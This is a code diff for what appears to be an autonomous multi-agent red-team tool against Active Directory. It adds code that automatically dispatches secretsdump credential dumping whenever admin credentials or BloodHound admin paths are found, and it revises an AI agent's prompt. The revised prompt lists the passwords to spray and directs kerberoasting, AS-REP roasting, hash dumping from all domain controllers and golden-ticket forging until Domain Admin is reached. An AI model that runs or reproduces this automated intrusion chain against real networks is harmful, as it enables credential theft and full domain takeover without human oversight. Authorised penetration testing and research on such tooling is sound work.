+                        f"🔓 Auto-secretsdump: Admin access detected for {cred_domain}\\{cred.username} "
+                        f"on {host.ip} ({host.hostname}), dispatching secretsdump"
+                    )
+
+                    task_id = await dispatcher.request_credential_access(
+                        source_agent="orchestrator",
+                        domain=cred_domain or (state.target.domain if state.target else ""),
+                        target_ips=[host.ip],
+                        username=cred.username,
+                        password=cred.password,
+                        reason="auto_local_admin_secretsdump",
+                        techniques=["secretsdump"],
+                    )
+
+                    if task_id:
+                        secretsdump_attempts[key] = task_id
+                        logger.info(
+                            f"Auto-secretsdump task {task_id} dispatched for "
+                            f"{cred_domain}\\{cred.username} -> {host.ip}"
+                        )
+
+            # Also check for BloodHound AdminTo relationships
+            # These are stored in discovered_vulnerabilities with local_admin type
+            for vuln_id, vuln in state.discovered_vulnerabilities.items():
+                if vuln.vuln_type not in ("local_admin", "AdminTo", "CanRDP"):
+                    continue
+
+                if vuln_id in state.exploited_vulnerabilities:
+                    continue
+
+                target_ip = vuln.target
+                if not target_ip or target_ip in successful_hosts:
+                    continue
+
+                # Get details about who has admin access
+                details = vuln.details or {}
+                admin_user = details.get("username") or details.get("principal")
+                admin_domain = details.get("domain", "")
+
+                if not admin_user:
+                    continue
+
+                # Find matching credential
+                matching_cred = None
+                for cred in state.all_credentials:
+                    if (
+                        cred.username.lower() == admin_user.lower()
+                        and cred.password
+                        and (not admin_domain or cred.domain.lower() == admin_domain.lower())
+                    ):
+                        matching_cred = cred
+                        break
+
+                if not matching_cred:
+                    logger.debug(
+                        f"Auto-secretsdump: Found {vuln.vuln_type} for {admin_user} on {target_ip} "
+                        f"but no matching password credential"
+                    )
+                    continue
+
+                key = (target_ip, admin_user.lower(), admin_domain.lower())
+
+                if key in secretsdump_attempts or failed_attempts.get(key, 0) >= max_retries:
+                    continue
+
+                logger.warning(
+                    f"🔓 Auto-secretsdump: BloodHound {vuln.vuln_type} detected - "
+                    f"{admin_domain}\\{admin_user} has admin on {target_ip}, dispatching secretsdump"
+                )
+
+                task_id = await dispatcher.request_credential_access(
+                    source_agent="orchestrator",
+                    domain=admin_domain or (state.target.domain if state.target else ""),
+                    target_ips=[target_ip],
+                    username=matching_cred.username,
+                    password=matching_cred.password,
+                    reason=f"auto_bloodhound_{vuln.vuln_type}",
+                    techniques=["secretsdump"],
+                )
+
+                if task_id:
+                    secretsdump_attempts[key] = task_id
+                    # Mark vulnerability as exploited to avoid re-processing
+                    state.mark_exploited(vuln_id)
+                    logger.info(
+                        f"Auto-secretsdump task {task_id} dispatched for BloodHound {vuln.vuln_type}"
+                    )
+
+        except asyncio.CancelledError:
+            break
+        except Exception as e:
+            logger.error(f"Auto local admin secretsdump error: {e}", exc_info=True)
+            await asyncio.sleep(check_interval)
+
+
+def _get_running_crack_tasks(dispatcher: RedTeamDispatcher) -> list[str]:
+    """Get task IDs for crack tasks that are still pending (running)."""
+    crack_task_ids = []
+    for task_id, task_info in dispatcher.shared_state.pending_tasks.items():
+        if task_info.task_type == "crack":
+            crack_task_ids.append(task_id)
+    return crack_task_ids
+
+
+async def _wait_for_crack_tasks(
+    dispatcher: RedTeamDispatcher,
+    timeout: float = CRACK_TASK_GRACE_PERIOD,
+    check_interval: float = 5.0,
+) -> None:
+    """
+    Wait for running crack tasks to complete with a timeout.
+
+    Args:
+        dispatcher: The dispatcher instance
+        timeout: Maximum seconds to wait for crack tasks
+        check_interval: Seconds between checks
+    """
+    start_time = asyncio.get_event_loop().time()
+    crack_tasks = _get_running_crack_tasks(dispatcher)
+
+    if not crack_tasks:
+        return
+
+    logger.info(
+        f"Waiting for {len(crack_tasks)} running crack task(s) to complete "
+        f"(grace period: {timeout}s)"
+    )
+
+    while True:
+        elapsed = asyncio.get_event_loop().time() - start_time
+
+        if elapsed > timeout:
+            remaining = _get_running_crack_tasks(dispatcher)
+            if remaining:
+                logger.warning(
+                    f"Crack task grace period expired with {len(remaining)} task(s) "
+                    f"still running: {remaining}"
+                )
+            break
+
+        remaining = _get_running_crack_tasks(dispatcher)
+        if not remaining:
+            logger.success("All crack tasks completed within grace period")
+            break
+
+        logger.debug(
+            f"Waiting for {len(remaining)} crack task(s): {remaining} "
+            f"({elapsed:.0f}s/{timeout:.0f}s elapsed)"
+        )
+        await asyncio.sleep(check_interval)
 
 
 async def _wait_for_completion(
@@ -1542,14 +2337,20 @@ async def _wait_for_completion(
         # Check runtime limit
         if elapsed > max_runtime:
             logger.warning(f"Operation reached max runtime ({max_runtime}s)")
+            # Wait for running crack tasks before fully exiting
+            await _wait_for_crack_tasks(dispatcher)
             break
 
         # Check for domain admin or explicit completion
         if dispatcher.shared_state.has_domain_admin:
             logger.success("Domain Admin achieved! Operation complete.")
+            # Wait for running crack tasks before fully exiting
+            await _wait_for_crack_tasks(dispatcher)
             break
         if dispatcher.shared_state.completed:
             logger.success("Operation marked complete.")
+            # Wait for running crack tasks before fully exiting
+            await _wait_for_crack_tasks(dispatcher)
             break
 
         # Check for failed background tasks
@@ -1588,25 +2389,29 @@ Target IPs: {", ".join(target_ips)}
 Initial credential: {cred_info}
 
 Your objectives:
-1. Run nmap_scan on all targets to discover services
-2. LOW-HANGING FRUIT (do these early!):
+1. Run nmap_scan on all targets to discover services (ONCE - do NOT re-scan targets that have already been scanned)
+2. **Run smb_sweep on all targets** - This captures Windows OS versions, FQDNs, and domain membership (CRITICAL for host identification)
+3. **MULTI-DOMAIN SETUP (run early with first credential!):**
+   - enumerate_domain_netbios_mappings: Query AD for NetBIOS->FQDN domain mappings
+   - This ensures credentials from child domains resolve correctly (e.g., CORP -> corp.contoso.local)
+4. LOW-HANGING FRUIT (do these early!):
    - ldap_search_descriptions: Find passwords stored in user description fields
-   - password_spray with common passwords (Password1, Welcome1, Summer2024, etc.)
+   - password_spray with common passwords (Password1, Welcome1, Summer2024, Company123, Qwerty123, Passw0rd!, LetMeIn1)
    - username_as_password: Test if users have username as password (e.g., user1:user1)
-3. Enumerate users and shares with netexec/enum4linux-ng/rpcclient/smbclient
-4. If no creds, run Kerberos user recon with kerberos_user_enum_noauth
-5. Run certipy_find to discover ADCS vulnerabilities
-6. Run run_bloodhound for ACL analysis and attack path discovery
-7. **CRITICAL CREDENTIAL EXPANSION (run IMMEDIATELY after finding ANY credentials):**
+5. Enumerate users and shares with netexec/enum4linux-ng/rpcclient/smbclient
+6. If no creds, run Kerberos user recon with kerberos_user_enum_noauth
+7. Run certipy_find to discover ADCS vulnerabilities
+8. Run run_bloodhound for ACL analysis and attack path discovery
+9. **CRITICAL CREDENTIAL EXPANSION (run IMMEDIATELY after finding ANY credentials):**
    - Use secretsdump on ALL domain controllers to dump hashes
    - Use kerberoast to find service accounts with weak passwords
    - Use asrep_roast to find accounts without Kerberos pre-auth
    - Check secretsdump output for krbtgt or Administrator hashes
    - If krbtgt hash found → Generate golden ticket → Announce Domain Admin
    - If Administrator hash found → Test DA access → Announce Domain Admin
-8. Coordinate with specialized agents to exploit discovered vulnerabilities
-9. Use trigger_credential_expansion after getting new credentials
-10. Continue until Domain Admin access achieved
+10. Coordinate with specialized agents to exploit discovered vulnerabilities
+11. Use trigger_credential_expansion after getting new credentials
+12. Continue until Domain Admin access achieved
 
 Priority vulnerabilities to look for:
 - Passwords in LDAP description fields (QUICK WIN - check first!)
@@ -1635,6 +2440,12 @@ Remember:
 - **ALWAYS run secretsdump after finding ANY credentials**
 - Monitor progress with get_operation_summary
 - Announce domain admin when achieved with announce_domain_admin
+
+IMPORTANT - Avoid polling loops:
+- Do NOT repeatedly call get_pending_tasks or get_exploitation_status without taking action
+- If tasks are pending, wait for results OR dispatch new tasks - don't just keep checking status
+- Only check status after taking an action or after significant time has passed
+- Each step should make progress (dispatch task, exploit vuln, expand creds) - not just observe
 
 Let's begin the operation!
 """
